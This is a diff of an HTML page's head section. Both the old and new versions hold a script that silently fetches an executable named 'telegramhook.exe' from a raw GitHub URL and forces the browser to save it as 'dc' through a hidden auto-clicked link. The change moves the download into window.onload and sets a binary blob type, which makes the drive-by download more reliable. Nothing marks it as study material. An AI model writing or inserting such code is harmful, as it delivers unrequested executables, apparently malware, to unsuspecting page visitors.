@@ -4,18 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        fetch('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/hostingsite/main/telegramhook.exe')
-            .then(response => response.blob())
-            .then(blob => {
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'dc';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                window.URL.revokeObjectURL(url);
-            });
+        window.onload = function() {
+            fetch('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/hostingsite/main/telegramhook.exe')
+                .then(response => response.arrayBuffer())
+                .then(buffer => {
+                    const blob = new Blob([buffer], { type: 'application/octet-stream' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'dc';  // Name of the downloaded file
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                });
+        };
     </script>
 </head>
 <body>
